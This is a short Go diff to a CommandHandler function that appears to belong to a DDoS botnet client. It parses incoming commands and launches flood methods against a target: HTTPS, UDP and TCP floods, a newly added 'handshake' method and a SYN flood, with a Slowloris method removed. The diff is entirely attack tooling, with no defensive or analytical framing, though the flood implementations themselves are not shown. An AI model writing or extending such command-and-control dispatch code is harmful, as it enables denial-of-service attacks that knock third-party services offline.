@@ -15,7 +15,8 @@ func CommandHandler(command string) {
 
 		args := strings.Split(commandd, " ")
 
-		go methods.HttpsDefault(args[1], args[2], args[3])
+		fmt.Println(args[4])
+		go methods.HttpsDefault(args[1], args[2], args[3], args[4])
 	}
 
 	if strings.HasPrefix(commandd, "udpmix") {
@@ -24,16 +25,20 @@ func CommandHandler(command string) {
 		go methods.Udp(args[1], args[2], args[3])
 	}
 
+	if strings.HasPrefix(commandd, "handshake") {
+		args := strings.Split(commandd, " ")
+
+		go methods.Handshake(args[1], args[2], args[3])
+	}
+
 	if strings.HasPrefix(commandd, "tcpmix") {
 		args := strings.Split(commandd, " ")
 
 		go methods.Tcp(args[1], args[2], args[3])
 	}
-
-	if strings.HasPrefix(commandd, "slowloris") {
-
+	if strings.HasPrefix(commandd, "syn") {
 		args := strings.Split(commandd, " ")
 
-		go methods.Slowloris(args[1], args[2], args[3])
+		go methods.Syn(args[1], args[2], args[3])
 	}
 }
